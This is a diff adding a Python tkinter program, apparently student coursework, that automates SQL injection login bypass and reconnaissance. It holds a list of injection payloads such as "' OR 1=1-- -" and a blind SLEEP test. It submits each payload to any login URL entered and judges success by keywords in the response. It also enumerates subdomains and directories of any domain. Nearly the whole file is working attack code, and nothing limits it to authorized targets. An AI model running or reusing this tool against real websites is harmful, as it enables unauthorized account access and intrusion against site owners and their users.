@@ -1,0 +1,239 @@
+CourseWork-2
+
+import tkinter as tk
+from tkinter import messagebox, scrolledtext, filedialog
+import requests
+
+# === List of Advanced SQL Injection Login Bypass Payloads ===
+SQLI_PAYLOADS = [
+    "' OR 1=1-- -",
+    "' OR '1'='1",
+    "') OR ('1'='1",
+    "admin' --",
+    "admin' #",
+    "admin'/*",
+    "' UNION SELECT NULL,NULL-- -",
+    "' OR 'x'='x",
+    "'='",
+    "'LIKE'",
+    "' AND 1=1", 
+    "' AND 'a'='a",
+    "' OR ''='",
+    "1' ORDER BY 1--+",
+    "1' ORDER BY 2--+",
+    "' AND SLEEP(5)-- -",  # Blind SQLi test
+]
+
+# === Wordlists for Reconnaissance ===
+SUBDOMAINS = ["admin", "dev", "test", "ftp", "smtp", "mail", "vpn", "blog", "shop", "api"]
+DIRECTORIES = ["admin", "login", "backup", "wp-admin", "upload", "config", "logs", "db"]
+
+# === Common headers to mimic browser traffic ===
+HEADERS = {
+    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0 Safari/537.36"
+}
+
+class EnhancedSQLiTool:
+    def __init__(self, root):
+        self.root = root
+        self.root.title("SQLI")
+
+        # --- Login URL Section ---
+        tk.Label(root, text="Login URL:").grid(row=0, column=0, sticky="w", padx=10, pady=5)
+        self.login_url_entry = tk.Entry(root, width=60)
+        self.login_url_entry.grid(row=0, column=1, padx=10, pady=5)
+
+        # --- Subdomain Enumeration Section ---
+        tk.Label(root, text="Subdomain Target (e.g., example.com):").grid(row=1, column=0, sticky="w", padx=10, pady=5)
+        self.subdomain_entry = tk.Entry(root, width=60)
+        self.subdomain_entry.grid(row=1, column=1, padx=10, pady=5)
+        self.subdomain_button = tk.Button(root, text="Enumerate Subdomains", command=self.run_subdomain_enum)
+        self.subdomain_button.grid(row=1, column=2, padx=10, pady=5)
+
+        # --- Subdirectory Enumeration Section ---
+        tk.Label(root, text="Subdirectory Target (e.g., http://example.com/):").grid(row=2, column=0, sticky="w", padx=10, pady=5)
+        self.subdir_entry = tk.Entry(root, width=60)
+        self.subdir_entry.grid(row=2, column=1, padx=10, pady=5)
+        self.subdir_button = tk.Button(root, text="Enumerate Directories", command=self.run_subdir_enum)
+        self.subdir_button.grid(row=2, column=2, padx=10, pady=5)
+
+        # --- Buttons for SQLi Functions ---
+        self.bypass_button = tk.Button(root, text="Bypass Login", command=self.run_login_bypass)
+        self.bypass_button.grid(row=3, column=0, padx=10, pady=10)
+
+        self.clear_button = tk.Button(root, text="Clear Log", command=self.clear_log)
+        self.clear_button.grid(row=3, column=1, padx=10, pady=10)
+
+        self.save_button = tk.Button(root, text="Save Log", command=self.save_log)
+        self.save_button.grid(row=3, column=2, padx=10, pady=10)
+
+        # --- Output Console ---
+        self.console = scrolledtext.ScrolledText(root, height=20, width=100)
+        self.console.grid(row=4, column=0, columnspan=3, padx=10, pady=10)
+        self.console.insert(tk.END, "[+] Ready for testing...\n")
+
+        # --- Status Label ---
+        self.status_label = tk.Label(root, text="Status: Waiting for input...", fg="blue")
+        self.status_label.grid(row=5, column=0, columnspan=3, pady=5)
+
+        # === Session Cookie Storage ===
+        self.session = requests.Session()
+        self.session.headers.update(HEADERS)
+
+    # === Run All Payloads to Bypass Login ===
+    def run_login_bypass(self):
+        login_url = self.login_url_entry.get().strip()
+        if not login_url:
+            messagebox.showwarning("Input Error", "Please enter a valid Login URL.")
+            return
+
+        self.log("[+] Starting SQL injection login bypass test...")
+        self.status_label.config(text="Status: Testing payloads...")
+
+        found = False
+        used_username = ""
+        used_password = ""
+
+        for payload in SQLI_PAYLOADS:
+            try:
+                data = {
+                    "login": payload,
+                    "password": payload,
+                    "form": "submit"
+                }
+
+                response = self.session.post(login_url, data=data)
+                self.log(f"[-] Response status code: {response.status_code}")
+
+                if self.is_login_successful(response):
+                    used_username = payload
+                    used_password = payload
+                    found = True
+                    break
+
+            except Exception as e:
+                self.log(f"[!] Error with payload '{payload}': {str(e)}")
+
+        if found:
+            self.log(f"[✓] Used Username: {used_username}")
+            self.log(f"[✓] Used Password: {used_password}")
+            self.status_label.config(text="Status: Login bypass successful!", fg="green")
+            messagebox.showinfo("Success", f"✅ Login Bypass Successful!\n\nUsed Username: {used_username}\nUsed Password: {used_password}")
+        else:
+            self.log("[✘] No payload worked. Site may not be vulnerable or requires manual cookie.")
+            self.status_label.config(text="Status: Login bypass failed.", fg="red")
+            messagebox.showerror("Failed", "❌ Could not bypass login.\nTry using cookies or check vulnerability.")
+
+    # === Check if Response Indicates Successful Login ===
+    def is_login_successful(self, response):
+        keywords = ["welcome", "logout", "profile", "dashboard", "user"]
+        for word in keywords:
+            if word.lower() in response.text.lower():
+                return True
+        return False
+
+    # === Subdomain Enumeration ===
+    def run_subdomain_enum(self):
+        domain = self.subdomain_entry.get().strip()
+        if not domain:
+            messagebox.showwarning("Input Error", "Please enter a domain (e.g., example.com)")
+            return
+
+        self.log(f"[+] Enumerating subdomains for {domain}...")
+        found_subs = []
+
+        for sub in SUBDOMAINS:
+            url = f"https://{sub}.{domain}" 
+            try:
+                res = requests.get(url, timeout=3)
+                if res.status_code < 404:
+                    self.log(f"[✓] Found: {url}")
+                    found_subs.append(url)
+                else:
+                    self.log(f"[-] Not found: {url}")
+            except:
+                self.log(f"[-] Down: {url}")
+
+        if found_subs:
+            self.log("[+] Summary: Subdomains found:")
+            for sub in found_subs:
+                self.log(f"     → {sub}")
+            messagebox.showinfo("Found Subdomains", "\n".join(found_subs))
+        else:
+            self.log("[-] No active subdomains found.")
+            messagebox.showinfo("Info", "No active subdomains found.")
+
+    # === Subdirectory Enumeration ===
+    def run_subdir_enum(self):
+        base_url = self.subdir_entry.get().strip()
+        if not base_url.endswith("/"):
+            base_url += "/"
+
+        if not base_url.startswith(("http://", "https://")): 
+            messagebox.showwarning("Input Error", "Enter a valid URL (e.g., http://example.com/)")
+            return
+
+        self.log(f"[+] Enumerating subdirectories for {base_url}...")
+        found_dirs = []
+
+        for path in DIRECTORIES:
+            url = base_url + path
+            try:
+                res = requests.get(url, timeout=3)
+                if res.status_code < 404:
+                    self.log(f"[✓] Found: {url}")
+                    found_dirs.append(url)
+                else:
+                    self.log(f"[-] Not found: {url}")
+            except:
+                self.log(f"[-] Error: {url}")
+
+        if found_dirs:
+            self.log("[+] Summary: Subdirectories found:")
+            for d in found_dirs:
+                self.log(f"     → {d}")
+            messagebox.showinfo("Found Subdirectories", "\n".join(found_dirs))
+        else:
+            self.log("[-] No directories found.")
+            messagebox.showinfo("Info", "No accessible directories found.")
+
+    # === Clear Log Console ===
+    def clear_log(self):
+        self.console.delete('1.0', tk.END)
+        self.log("[+] Log cleared.")
+
+    # === Save Log to File (.txt or .csv) ===
+    def save_log(self):
+        filetypes = [("Text files", "*.txt"), ("CSV files", "*.csv")]
+        filename = filedialog.asksaveasfilename(defaultextension=".txt", filetypes=filetypes)
+
+        if not filename:
+            return  # User canceled
+
+        try:
+            ext = os.path.splitext(filename)[1]
+            with open(filename, "w", encoding="utf-8") as f:
+                content = self.console.get('1.0', tk.END)
+                if ext == ".txt":
+                    f.write(content)
+                elif ext == ".csv":
+                    import csv
+                    writer = csv.writer(f)
+                    writer.writerow(["Timestamp", "Log"])
+                    for line in content.splitlines():
+                        writer.writerow(["", line])
+                messagebox.showinfo("Saved", f"Log saved to:\n{filename}")
+        except Exception as e:
+            messagebox.showerror("Error", f"Could not save log:\n{str(e)}")
+
+    # === Log to Console ===
+    def log(self, message):
+        self.console.insert(tk.END, message + "\n")
+        self.console.see(tk.END)
+
+
+# === Run Application ===
+if __name__ == "__main__":
+    root = tk.Tk()
+    app = EnhancedSQLiTool(root)
+    root.mainloop()
